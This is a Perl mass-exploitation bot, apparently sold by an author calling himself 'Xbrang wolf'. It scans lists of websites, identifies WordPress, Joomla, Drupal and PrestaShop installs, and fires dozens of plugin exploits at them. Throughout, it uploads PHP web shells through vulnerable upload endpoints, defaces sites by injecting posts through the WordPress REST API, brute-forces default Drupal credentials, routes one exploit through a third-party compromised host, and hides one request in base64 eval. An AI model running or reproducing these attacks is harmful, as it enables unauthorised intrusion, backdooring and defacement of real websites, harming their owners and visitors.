#!/usr/bin/perl
#Xbrang.wolf
use IO::Select;
use HTTP::Response;
use HTTP::Request::Common qw(GET);
use URI::URL;
use IO::Socket::INET;
use Term::ANSIColor qw(:constants);
use MIME::Base64;
use LWP;
use HTTP::Cookies;
use HTML::Entities;
use URI::Escape;
#use Win32::Console::ANSI;
use Term::ANSIColor;
use LWP::UserAgent;
use HTTP::Request;
use HTTP::Request::Common qw(POST);
use LWP::UserAgent;
use HTTP::Request::Common;
use Term::ANSIColor;
use HTTP::Request::Common qw(GET);
$ag = LWP::UserAgent->new();
use MIME::Base64;
#Hello kids :D 
#Coded By Wolf xbrang
#This tool for sell #ps:if you have this tool free it means you are one of the best friends of mine


system("title BOT v3.7 Wolf Xbrang ");
    print color('reset');
if ($^O =~ /MSWin32/) {system("cls"); }else { system("clear"); }



$xbrangwolf ="
\t       [Wolf xbrang]
\t __  __       _ _   _ ____                  
\t|  \/  |_   _| | |_(_) ___|  ___ __ _ _ __  
\t| |\/| | | | | | __| \___ \ / __/ _` | '_ \
\t| |  | | | | | | |_| |___) | (_| (_| | | | |
\t|_|  |_|\__,_|_|\__|_|____/ \___\__,_|_| |_| v3.7



     [+]     [this Bot not free for sell Xbrang wolf]
	 
	 
";
print color('bold red');

print $xbrangwolf;

    print color('reset');

    print color('bold white');
    print color('reset');
print color("bold Green"), "BOT v3.7 code by Xbrang wolf :) \n";
print color("cyan"), "BOT v3.7 Wolf Xbrang :) \n";
print color 'reset';
print color("bold yellow"),"Contact me [facebook.com/xbrang.wolf] \n\n";
print color 'reset';
print color("bold white"),"How much you want ? \n";
print color("red"),"\n[*]-sites \nor \n[*]-ip\n";
print color 'reset';

print color("bold white"),"~_~\n";

print color("bold white"),"*_~\n";
print "Marocan wolf  Team : ";
print "Wolf Xbrang : ";
my $targett = <STDIN>;
chomp $targett;

if($targett eq 'ip')
{
print color("cyan"), "Enter List IP:";
my $list=<STDIN>;
chomp($list);
	open (THETARGET, "<$list") || die "[-] Can't open the List of site file ?!";
@TARGETS = <THETARGET>;
close THETARGET;
$link=$#TARGETS + 1;



OUTER: foreach $tofuck(@TARGETS){
chomp($tofuck);
if($tofuck =~ /http:\/\/(.*)\//) {
$tofuck= $1;
gett();
}else{
gett();
}

}
}
#Code by mr xbrang wolf please dont chonge :) les kids

if ($^O =~ /MSWin32/) {system("cls"); }else { system("clear"); }

print q{

_________________________________________________
............   Mr wolf Xbrang   .................

     ,   .-'"'=;_  ,
              |\.'-~`-.`-`;/|
              \.` '.'~-.` './
              (\`,__=-'__,'/)
           _.-'-.( d\_/b ).-'-._
         /'.-'   ' .---. '   '-.`\
       /'  .' (=    (_)    =) '.  `\
      /'  .',  `-.__.-.__.-'  ,'.  `\
     (     .'.   V       V  ; '.     )
     (    |::  `-,__.-.__,-'  ::|    )
     |   /|`:.               .:'|\   |
     |  / | `:.              :' |`\  |
     | |  (  :. Wolf Xbrang .:  )  | |
     | |   ( `:.            :' )   | |
     | |    \ :.  BOT v3.7 .: /    | |
     | |     \`:.         .:'/     | |
     ) (      `\`:.     .:'/'      ) (
     (  `)_     ) `:._.:' (     _(`  )
     \  ' _)  .'           `.  (_ `  /
      \  '_) /   .'"```"'.   \ (_`  /
       `'"`  \  (         )  /  `"'`
   ___   jgs  `.`.       .'.'        ___
 .`   ``"""'''--`_)     (_'--'''"""``   `.
(_(_(___...--'"'`         `'"'--...___)_)_
________________________________________________\n\n
};
print colored ("[ Let's get to the world of magic $datetime ]",'white on_red'),"\n\n";

open(tarrget,"<sites.txt") || die "[-] Can't open the List of site file !";
while(<tarrget>){
chomp($_);
$site = $_;
print color("cyan"), "[*] Exploit by Xbrang v3.7 : ";
print color("bold red"), "".scalar(@TARGETS)."\n\n";
print color('reset');
if($site !~ /http:\/\//) { $site = "http://$site/"; };
efrez();
}
sub efrez($site){
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
$ua->timeout (10);

my $efreez = $ua->get("$site")->content;
my $efreezz = $ua->get("$site/admin")->content;
if($efreez =~/wp-content\/themes\/|wp-content\/plugins\/|wordpress/) {
      print color("Red"), "[*]	 WORDPRESS: ".$site."\n\n";
open(save, '>>Result/wordpress.txt');
    print save "$site\n";
    close(save);
dlskin();
wysija();
jobmanager();
gravity();
wpinjetc();
jombmang();
Auto();
Indexhtm();
revshell();
revsheldl();
XBRANG();
formcraftwolf();
}

elsif($efreezz =~/\/Prestashop|\/js\/jquery\/plugins\/|<meta name=\"Generator\" content=\"Prestashop/) {
	print "[-] $site \n";	
   print color("bold green"), " [*]- Prestashop\n\n";     print color('reset');

open(save, '>>Result/Prestashop.txt');
    print save "$site\n";
    close(save);
    prestaxbrang();
    prestaouthrxbrang();
	}
elsif($efreezz =~/common\/forgotten/) {
 print color("cyan"), "[*]:---> OPENCART: ".$site."\n\n";
open(save, '>>Result/opencart.txt');
    print save "$site\n";   
    close(save);
    }


elsif($efreez =~/\/modules\/system\/system.menus.css|\/sites\/default\/files\/|<meta name=\"Generator\" content=\"Drupal 7/) {
   print color("cyan"), "[*]:---> Drupal: ".$site."\n\n";
    fuckdrupal();

open(save, '>>Result/Drupal.txt'); 
    print save "$site\n";   
    close(save);
    }
elsif($efreez =~/<script type=\"text\/javascript\" src=\"\/media\/system\/components\/js\/com_foxcontact\/mootools.js\"><\/script>|Joomla!|Joomla|joomla/) {

    print color("cyan"), "[*]:---> Joomla  : ".$site."\n\n";
open(save, '>>Result/foxcontact.txt');
    print save "$site\n";   
    close(save);
	
foxcontactxbrang();
comadsmanegr();
comusers();
comjce();
expljomla2();
comjcea();
comediaindex();
comediaindexf();
comblog();
comjdowloads();
comjdowloadss();
hdflvplayer();
comfabr();
indecomfabr();
    }
elsif($efreezz =~/wp-content|wordpress|xmlrpc.php/) {
 print color("cyan"), "[*]:---> wp-content: ".$site."\n\n";
    open(save, '>>Result/wp-content.txt');
    print save "$site\n";   
    close(save);
	formcraft();
	}

	
elsif($efreezz =~/index\/forgotpassword/) {
    print color("cyan"), "[*]:---> MAGENTO: ".$site."\n\n";
open(save, '>>Result/magento.txt');
    print save "$site\n";   
    close(save);
    }else{
	
print color("cyan"),"no:--->  $site\n";
	adminchk();
}
}


######## Drupal d zabi################
sub fuckdrupal(){

$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (20);

# check the link of the exploit or you can download script from here : http://pastebin.com/wPAbtyJ4 and you upload it on you one shell :) 
$drupalink = "http://www.cleanuptheworld.org/images/au/mast/gg.php";
my $exploit = "$drupalink?url=$site&submit=submit";
my $checkk = $ua->get("$exploit")->content;
if($checkk =~/Success!/) {
print "DRUPAL EXPLOIT:";
print color('bold white')," ................... ";
print color('bold white'), "[+] Vuln";
print "\n";

print "WAIT I WILL MAKE SURE ABOUT USER AND PASSWORD\n";
# // here to test the user name and the password if the website has been really fucked or not :p
$admin ="gassrini";
$pass  ="admin";
$wp = $site . '/user/login';
$red = $site . '/user/1';
print "$wp\n";

$brute = POST $wp, [name => $admin, pass => $pass, form_build_id =>'', form_id => 'user_login',op => 'Log in', location => $red];
$response = $ua->request($brute);
$stat = $response->status_line;
    if ($stat =~ /302/){
print "BOOM $site => User | $admin Password | $pass","\n";
    open(save, '>>Result/Drupal.txt');
    print save "Success  ! $site | username : gassrini | pass: admin\n";
    close(save);
    }
    elsif ($stat =~ /404/){
    print "NOT DRUPAL ...................>: ERROR\n";
    }
}else{
# // here to test user: admin and password : admin on the panel admin 
print "TRYING WITH USER AND PASSWORD ADMIN\n"; 
$admin="admin";
$pass ="admin";
$dr = $site . '/user/login';
$brute = POST $dr, [name => $admin, pass => $pass, form_build_id =>'', form_id => 'user_login',op => 'Log in'];
$response = $ua->request($brute);
$stat = $response->status_line;
    if ($stat =~ /302/){

print "BOOM $site=> User | $admin Password | $pass","\n";

    open(save, '>>Result/Drupal.txt');
    
    print save "Success wolf ! $site | username : $admin | pass: $pass\n";
    
    close(save);
    }else{
print color('bold white')," [+]Drupal ................... ";
print "ERROR";
print "\n";

        }
    
}
}
###########################FormCraft##############################################
sub formcraftwolf(){
print"[FormCraft Upload] ................... ";

$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
$ua->timeout (10);
$link = $site."/wp-content/plugins/formcraft/file-upload/server/php/";
my $conte = $ua->get("$link")->content;
if ($conte =~/{"files"/){
   
    upform();
}else{
    print color('bold red');
print  "[Fals]\n";
    print color('reset');

}

}

sub upform(){
{
my $url = "$site/wp-content/plugins/formcraft/file-upload/server/php/";
my $picture ="xbrangwolf.php"; 
my $field_name = "files[]";

my $response = $ua->post( $url,
            Content_Type => 'form-data',
            Content => [ $field_name => ["$picture"] ]
           
            );
$upzzspy = $site. '/wp-content//plugins//formcraft//file-upload//server//php//files//xbrangwolf.php'; 
my $taz = $ua->get("$upzzspy")->content;
if ($taz =~ /xbrang Wolf/){
   print color('bold green');
print "[+] UPLOADED]\n";
print color('reset');

open(save, '>>shells.txt');   
print save "$upzzspy\n";   
close(save);
}else{
    print color('bold red');
print  "[[-]  NOT Vuln]\n";
    print color('reset');}
}

}





####################wp-content####################################################

sub formcraft(){
my $url = "$site//wp-content/plugins/add-list-css/";
my $url = "$site//wp-content/plugins/revslider/temp/update_extract/revslider/";
my $url = "$site/wp-content/plugins/formcraft/file-upload/server/php/";
my $url = "$site///wp-content/plugins/downloads-manager/upload/";
my $url = "$site/wp-content/plugins/formcraft/file-upload/server/php/";


my $shell ="xbrangwolf.php";
my $field_name = "files[]";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);
$formcraftup="$site/wp-content/plugins/formcraft/file-upload/server/php/files/xman.php";
$formcraftup="$site//wp-content/plugins/revslider/temp/update_extract/revslider/xman.php";
$formcraftup="$site///wp-content/plugins/downloads-manager/upload/xman.php";
$formcraftup="$site///wp-content/plugins/add-list-css/xman.php";
$formcraftup="$site/wp-content/plugins/formcraft/file-upload/server/php/files/xman.php";

if ($response->content =~ /{"files/) {

print color('Red'), "(*) - Fuck ...>:$site\n";

print color('bold yellow'), "[+] VULN\n";

print "(+)Shell Uploaded\n";
 print color('bold white'),"[+]  [Dir] => $formcraftup\n";
print "\n";
 open (TEXT, '>>Result/wp-shellz.txt');
        print TEXT " wp-conct SHELL => $formcraftup\n";
        close (TEXT);
}else{
print color('bold yellow'), "...................>: ";
print "[-]  [-]  NOT Vuln";
print "\n";
}

    }

#####################




sub Auto(){
print"[Auto Upload] ................... ";

$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
$ua->timeout (10);
$link = $site."/wp-content/plugins/formcraft/file-upload/server/php/";
my $conte = $ua->get("$link")->content;
if ($conte =~/{"files"/){
   
    upform();
}else{
    print color('bold red');
print  "[[-]  NOT Vuln]\n";
    print color('reset');

}

}

sub upform(){
{
my $url = "$site/wp-content/plugins/formcraft/file-upload/server/php/";
my $picture ="xman.php"; 
my $field_name = "files[]";

my $response = $ua->post( $url,
            Content_Type => 'form-data',
            Content => [ $field_name => ["$picture"] ]
           
            );
$upzzspy = $site. '/wp-content//plugins//formcraft//file-upload//server//php//files//xman.php'; 
my $taz = $ua->get("$upzzspy")->content;
if ($taz =~ /xbrang wolf/){
   print color('bold green');
print "[Success]\n";
print color('reset');

open(save, '>>BOTrslt/Shell3z.txt');   
print save "$upzzspy\n";   
close(save);
}else{
    print color('bold red');
print  "[[-]  NOT Vuln]\n";
    print color('reset');}
}

}

## Wordpress Inject ##########################################

sub wpinjetc($site){
print"[Wordpress Inject] ................... ";

$linkposts = $site . 'index.php/wp-json/wp/v2/posts/';



$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
$ua->timeout (30);


$sorm = $ua->get($linkposts);
$karza = $sorm->content;
if($karza =~/\/?p=(.*?)\"\}/)
{
$id=$1;
$ajx = $site . '/wp-json/wp/v2/posts/'.$id;



	
$defx="														<h2><center>Mr wolf xbrang <center></h2>
						</div>
						<div class=\"post_content\">
							<p><title>HACKED by Xbrang  wolf
</title></p>
<div style=\"text-align: center\"><font size=\"6\" face=\"comic sans ms\"><b>Hacked By Mr wolf xbrang Bot V3</b></font></div>
<div style=\"text-align: center\"><font size=\"5\" face=\"comic sans ms\"><b><br /></b></font></div>
<div style=\"text-align: center\"><font size=\"5\" face=\"comic sans ms\"><b><font color=red>HACKED</font> Mr wolf xbrang <font color=red>HACKED</font> Mr wolf xbrang <font color=red>HACKED</font> Mr wolf xbrang <font color=red>HACKED</font> Mr wolf xbrang <font color=red>HACKED</font> Mr wolf xbrang <br /></b></font></div>
<div style=\"text-align: center\"><font size=\"5\" face=\"comic sans ms\"><b>thank you gassrini for the tool  <br /></b></font></div>
<div style=\"text-align: center\"><font size=\"5\" face=\"comic sans ms\"><b></p>
<p>
						</div>";
$file="wolf.html";
$sirina=$id . 'justracccwdata';
$def=  $site . 'wolf.html';
$gassface = POST $ajx, ['id' => $sirina, 'title' => 'HACKED By Mr wolf xbrang', 'slug'=> $file,'content' => $defx];
$response = $ua->request($gassface);
$stat = $response->content;
	if ($stat =~ /xbrang wolf/){
   print color('bold green');
print "[Succes]\n";
    print color('reset');
				    open(save, '>>BOTrslt/index.txt');  
    print save "$def\n";  
    close(save);
zoneh();

	}
else{
   print color('bold red');
print "[[-]  NOT Vuln]\n";
    print color('reset');}
}
else{
   print color('bold red');
print "[[-]  NOT Vuln]\n";
    print color('reset');}
}



######################
######################
######################
#####  job-mang   ######
######################
######################
######################

sub jombmang(){
print"[Manger Exploit] ................. ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
$ua->timeout (10);
$link ="$site/jm-ajax/upload_file";
my $conte = $ua->get("$link")->content;
if($conte =~/{"files/) {
   
    print color("green"), "[vuln]\n";
    print color('reset');
	
    open(save, '>>Result/job.txt');
    print save "$site/post-a-job/\n";   
    close(save);
    tazz();
}else{
   print color('bold red');
print color("Red"), "[[-]  NOT Vuln]\n";
    print color('reset');
	}

}

sub tazz(){
my $url = "$site/jm-ajax/upload_file/";
my $picture ="xbrang_wolf.gif"; # Chaneg xbrang_wolf.gif By Your PICTURE Name
my $field_name = "file[]";

my $response = $ua->post( $url,
            Content_Type => 'form-data',
            Content => [ $field_name => ["$picture"] ]
           
            );

$def = $site. '/wp-content/uploads/job-manager-uploads/file/2017/06/xbrang_wolf.gif'; # Chaneg xbrang_wolf.gif By Your PICTURE Name
			$check = $ua->get($def)->status_line;
if ($check =~ /200/){
   print color('bold green');
print "[+] UPLOADED]\n";
    print color('reset');
print color('reset');
open(save, '>>BOTrslt/index.txt');   
print save "$def\n";   
close(save);
zoneh();
}else{
print color('Red'), "[Not Upload]\n";
}
}

#########JCE d zabi ##############

   sub comjce($site){
print color('bold white'), "[+] COM JCE:";
$ua = LWP::UserAgent->new();
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout(15);


$exploiturl="/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20";

$vulnurl=$site.$exploiturl;
$res = $ua->get($vulnurl)->content;
if ($res =~ m/No function call specified!/i){
    open(save, '>>Result/vulntargets.txt');   
    print save "JCE $site\n";   
    close(save);

     print color('Red'), "...................>: ";
print "[+]VULN JCE";
print "\nUploading Prcing ";
my $res = $ua->post($vulnurl,
    Content_Type => 'form-data',
    Content => [
        'upload-dir' => './../../',
        'upload-overwrite' => 0,
        'Filedata' => "mwolf.gif",
        'action' => 'upload'
        ]
    )->decoded_content;
if ($res =~ m/"error":false/i){

}else{
print color('bold green'), "...................>: ";
print color('Red'), "[+] Vuln";
print "\n";
}

$remote = IO::Socket::INET->new(
        Proto=>'tcp',
        PeerAddr=>"$site",
        PeerPort=>80,
        Timeout=>15
        );
$def= "$site/mwolf.gif";
$check = $ua->get($def)->status_line;
if ($check =~ /200/){
print color('bold yellow'), "...................>: ";
print "Exit";
print "\n";
print color('Red'), "[-]LINK Dir => $def\n";
zoneh();
mirrorzon();
}
}else{
print color('bold yellow'), "...................>: ";
print "[-]  [-]  NOT Vuln";
print "\n";
}

    }


##### Jdownload ######


    sub comjdowloadss($site){
print"[comjdowloads Upload] ................ ";


$file="wolf.zip";
$filez="wolf.php.php.j";
$jdup= $site . 'index.php?option=com_jdownloads&Itemid=0&view=upload';
$shellpath= $site . '/images/jdownloads/screenshots/wolf.php.php.j';

my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");

my $exploit = $ua->post("$jdup", Cookie => "", Content_Type => "form-data", Content => [ name=>"xbrang wolf", mail=>"zakarai0611420990@gmail.com", filetitle =>"Marocan wolf", catlist=>"1", license=>"0", language=>"0", system=>"0",file_upload=>["$file"], pic_upload=>["$filez"], description=>"<p>zot</p>", senden=>"Send file", option=>"com_jdownloads", view=>"upload", send=>"1", "0d6b031d7c5629129647e4018aba93d6"=>"1"]);

if ($exploit->decoded_content =~ /The file was successfully transferred to the server/) {
 

my $checkshell = $ua->get("$shellpath")->content;
if($checkshell =~/xbrang wolf/) {
    print color('bold green');
print "[+] UPLOADED]\n";
    print color('reset');        open (TEXT, '>>Result/Shell3z.txt');
        print TEXT "[ JDWN SHELL] => $shellpath\n";
        close (TEXT);
}

}else{
    print color('bold red');
print "[[-]  NOT Vuln]\n";
    print color('reset');
}


print"[comjdowloads Index ] ................ ";

$def = $site . '/images/jdownloads/screenshots/wolf.php.php.j';
$filee="wolf.zip";
$filezz="wolf.php.php.j";
my $exploitx = $ua->post("$jdup", Cookie => "", Content_Type => "form-data", Content => [ name=>"xbrang wolf", mail=>"zakarai0611420990@gmail.com", filetitle =>"Marocanwolf", catlist=>"1", license=>"0", language=>"0", system=>"0",file_upload=>["$filee"], pic_upload=>["$filezz"], description=>"<p>zot</p>", senden=>"Send file", option=>"com_jdownloads", view=>"upload", send=>"1", "0d6b031d7c5629129647e4018aba93d6"=>"1"]);
if ($exploit->decoded_content =~ /The file was successfully transferred to the server/) {


my $response = $ua->get("$def")->status_line;
if ($response =~ /200/){
    print color('bold green');
print "[Success]\n";
    print color('reset');

        open (TEXT, '>>Result/index.txt');
        print TEXT "[ JDWN Index] => $def\n";
        close (TEXT);

zoneh();
}else{
    print color('bold red');
print "[[-]  NOT Vuln]\n";
    print color('reset');
        }
}
else{
    print color('bold red');
print "[[-]  NOT Vuln]\n";
    print color('reset');

}

    }


##########COM MEDIA d zabi #########|
sub comediaindexf(){

print color('bold yellow'), " [+] COM MEDIA:";		


$filemedia = "xbrang_wolf.gif";
$indexmedia="$site/images/xbrang_wolf.gif";
$ua = LWP::UserAgent->new;
$ua->agent("Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.1) Gecko/20090624 Firefox/3.5");
$sorm = $ua->get($tarmedia);
$karza = $sorm->content;
if($karza =~/<form action="(.*?)" id=\"uploadForm\" class=\"form-horizontal\" name=\"uploadForm\" method=\"post\" enctype=\"multipart\/form-data\">/ || $karza =~ /<form action="(.*?)" id=\"uploadForm\" name=\"uploadForm\" method=\"post\" enctype=\"multipart\/form-data\">/ )
{
$url = $1;
$url =~ s/&amp;/&/gi;
    my $res = $ua->post($url, Content_Type => 'form-data', Content => [ Filedata => [$filemedia] ]);
 my $check = $ua->get("$indexmedia")->content;
if($check->content =~/Hacked/ ) {
 print " Success Defaced \n ";

        open (TEXT, '>>Result/Com Media Index.txt');
        print TEXT "[ COM MEDIA Index] => $indexmedia \n";
        close (TEXT);


        $def = $indexmedia;
    zoneh();
        }
    } else{
    print color('bold red');
print "[[-]  NOT Vuln]\n";
    print color('reset');
        }
}


#mode exploit ##############################################
   sub expljomla2($site){
print"[mod_simplefileupload ] .............. ";

my $gh = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$gh->timeout(10);
$gh->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
   
   
$file="xbrang_v3.7.php";
$jdup= $site . '/modules/mod_simplefileuploadv1.3/elements/xbrang.php';
$shell= $site . '/modules/mod_simplefileuploadv1.3/elements/xbrang_v3.7.php';



my $exploit = eval(decode_base64('JGdoLT5wb3N0KCIkamR1cCIsIENvbnRlbnRfVHlwZSA9PiAibXVsdGlwYXJ0L2Zvcm0tZGF0YSIsIENvbnRlbnQgPT4gWyBmaWxlPT5bIiRmaWxlIl0gLCBzdWJtaXQ9PiJVcGxvYWQiIF0pOw=='));


my $check = $gh->get("$shell")->content;
if($check =~/wolf xbrang/) {
    print color('bold green');
print "[Success]\n";
    print color('reset');
        open (TEXT, '>>Result/Shell3z.txt');
        print TEXT "[ Shell LINK ] => $site/xbrangwolf.php\n";
        close (TEXT);
		        open (TEXT, '>>Result/index.txt');
		        print TEXT "[ Deface Link LINK ] => $site/wolf.html\n";
        close (TEXT);

		$def =$site .'/wolf.html';
zoneh();

}
else
{
    print color('bold red');
print "[[-]  NOT Vuln]\n";
    print color('reset');
}


}




######################################Prestashop####################################################
######################################wolfx~brang###################################################

sub prestaxbrang(){


my $url = "$site//modules//advancedslider/uploads/";
my $url = "$site//modules//cartabandonmentpro/uploads/";
my $url = "$site//modules//cartabandonmentproOld/uploads/";
my $url = "$site//modules//videostab/uploads/";
my $url = "$site//modules//advancedslider/";
my $url = "$site//modules/cartabandonmentpro/";
my $url = "$site//modules/cartabandonmentproOld/";
my $url = "$site//modules//videostab/"; 
my $file="prestawolf.zip";
my $shell ="xbrangwolf.php";
my $field_name = "files[]";


my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);

$formcraftup="$site//modules//advancedslider/uploads/xbrangwolf.php";
$formcraftup="$site//modules//cartabandonmentpro/uploads/xbrangwolf.php";
$formcraftup="$site//modules//cartabandonmentproOld/uploads/xbrangwolf.php";
$formcraftup="$site//modules//videostab/uploads/xbrangwolf.php";
$formcraftup="$site//modules//advancedslider/ajax_advancedsliderUpload.php?action=submitUploadImage%26id_slide=php";
$formcraftup="$site//modules/cartabandonmentpro/upload.php";
$formcraftup="$site//modules/cartabandonmentproOld/upload.php";
$formcraftup="$site//modules//videostab/ajax_videostab.php?action=submitUploadVideo%26id_product=upload";

if ($response->content =~ /{"files/) {
print color("bold Green"),"[";
print color("yellow"),"+";
print color('bold red'),"] ";
print color('bold white'),"Exploiting wait";
print color('bold white')," =============>> ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Up :D\n";
print color('bold white'),"$formcraftup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$formcraftup\n";
close (TEXT);
}else{
print color('bold red'),"(";
print color('bold green'),"+";
print color('bold red'),") ";
print color('bold white'),"Exploiting wait";
print color('bold white')," ==============>> ";
print color('bold red'),"site [-]  NOT Vuln";
print color('bold white'),"\n";
}
}
#################################outhr exploit by xbrang#####################

sub prestaouthrxbrang(){
my $url = "$site//modules//wg24themeadministration/";
my $url = "$site//modules///fieldvmegamenu/ajax/";
my $url = "$site//modules//wdoptionpanel/";
my $url = "$site//modules///pk_flexmenu//ajax/";
my $url = "$site//modules///pk_vertflexmenu/";
my $url = "$site//modules/nvn_export_orders/";
my $url = "$site//modules/megamenu/uploadify/";
my $url = "$site//modules///orderfiles//ajax/";
my $file="prestawolf.zip";
my $shell ="wolf.php.png";
my $field_name = "files[]";

my $field_name =  "files[]";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["wolf.php.png"],]);

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);
$formcraftup="$site//modules//wg24themeadministration/wg24_ajax.php";
$formcraftup="$site//modules///fieldvmegamenu/ajax/upload.php";
$formcraftup="$site//modules//wdoptionpanel/wdoptionpanel_ajax.php";
$formcraftup="$site//modules///pk_flexmenu//ajax/upload.php";
$formcraftup="$site//modules///pk_vertflexmenu//ajax/upload.php";
$formcraftup="$site//modules/nvn_export_orders/upload.php";
$formcraftup="$site//modules/megamenu/uploadify/uploadify.php?id=xbrangwolf.php";
$formcraftup="$site//modules///orderfiles//ajax/upload.php";

if ($response->content =~ /{"files/) {
print color("bold Green"),"[";
print color("yellow"),"+";
print color('bold red'),"] ";
print color('bold white'),"Wait..";
print color('bold white')," =========================>> ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Up :D\n";
print color('bold white'),"$formcraftup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$formcraftup\n";
close (TEXT);
}else{
print color('bold red'),"(";
print color('bold green'),"+";
print color('bold red'),") ";
print color('bold white'),"Wait..";
print color('bold white')," ===========================>> ";
print color('bold red'),"[-]  NOT Vuln";
print color('bold white'),"\n";
}
}
#################################outhr exploit by xbrangg#####################

sub jobmanager(){
my $url = "$site//wp-content/uploads/job-manager-uploads/file/";

my $shell ="xbrangwolf.php";
my $field_name = "files[]";

my $field_name =  "files[]";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["xbrangwolf.php"],]);

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);

$formcraftup= "$site/wp-content/uploads/job-manager-uploads/file/xbrangwolf.php";


if ($response->content =~ /{"files/) {
print color("bold Green"),"[";
print color("yellow"),"+";
print color('bold red'),"] ";
print color('bold white'),"Wait..";
print color('bold white')," =========================>> ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Up :D\n";
print color('bold white'),"$formcraftup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$formcraftup\n";
close (TEXT);
}else{
print color('bold red'),"(";
print color('bold green'),"+";
print color('bold red'),") ";
print color('bold white'),"Wait..";
print color('bold white')," ===========================>> ";
print color('bold red'),"[-]  NOT Vuln";
print color('bold white'),"\n";
}
}
########################################## INDEX ###################################################
sub comediaindex(){
$shlez = "xbrang_wolf.gif";
$shlz="$site/images/xbrang_wolf.gif";

print "INDEX LINK =>  $shlz","\n";
#$index="$site/xbrang_wolf.gif";
$ua = LWP::UserAgent->new;
$ua->agent("Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.1) Gecko/20090624 Firefox/3.5");
$sorm = $ua->get($tarmedia);
$karza = $sorm->content;
if($karza =~/<form action="(.*?)" id=\"uploadForm\" class=\"form-horizontal\" name=\"uploadForm\" method=\"post\" enctype=\"multipart\/form-data\">/ || $karza =~ /<form action="(.*?)" id=\"uploadForm\" name=\"uploadForm\" method=\"post\" enctype=\"multipart\/form-data\">/ )
{
$url = $1;
$url =~ s/&amp;/&/gi;
 print "\n UPLOADING INDEX";
    my $res = $ua->post($url, Content_Type => 'form-data', Content => [ Filedata => [$shlez] ]);
 $check = $ua->get($shlz);
if($check->content =~/Hacked/ || $check->is_success ) {
 print "...................>: ";
print "DEFACED";
print "\n";

        print "INDEX LINK =>  $shlz","\n";
        $def="$shlz";
    zoneh();
mirrorzon()
        }

        }
    }
###############jdowloads##################################

        sub comjdowloads($site){
print "COM JDOWNLOADS";
$file="wolf.zip";
$filez="wolf.php.php.j";
$jdup= $site . 'index.php?option=com_jdownloads&Itemid=0&view=upload';
$shellpath= $site . '/images/jdownloads/screenshots/wolf.php.php.j';

my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");

my $exploit = $ua->post("$jdup", Cookie => "", Content_Type => "form-data", Content => [ name=>"wolf xbrang ", mail=>"zakarai0611420990@gmail.com", filetitle =>"Marocan Wolf  Team", catlist=>"1", license=>"0", language=>"0", system=>"0",file_upload=>["$file"], pic_upload=>["$filez"], description=>"<p>zot</p>", senden=>"Send file", option=>"com_jdownloads", view=>"upload", send=>"1", "0d6b031d7c5629129647e4018aba93d6"=>"1"]);

if ($exploit->decoded_content =~ /The file was successfully transferred to the server/) {
print "...................>: ";
print "[+] Vuln";
print "\n";
    open(save, '>>Result/vulntargets.txt');   
    print save "jdownloads $site\n";   
    close(save);

print "SCANING SHELL ...................>: ";
print "WAIT";
print "\n";

my $checkshell = $ua->get("$shellpath")->content;
if($checkshell =~/wolf/) {
print "SHELL LINK => $shellpath","\n";
        open (TEXT, '>>Result/shells.txt');
        print TEXT " jdownloads SHELL => $shellpath\n";
        close (TEXT);
}else{
##################################################################
print "ERROR ...................>: ";           
print "SHELL 404";
print "\n";

}

# // if shell not uploaded this will upload a gif index //

print "JDOWNLOAD INDEX:";

$def = $site . '/images/jdownloads/screenshots/mwolf.gif';
$filee="wolf2.zip";
$filezz="mwolf.gif";
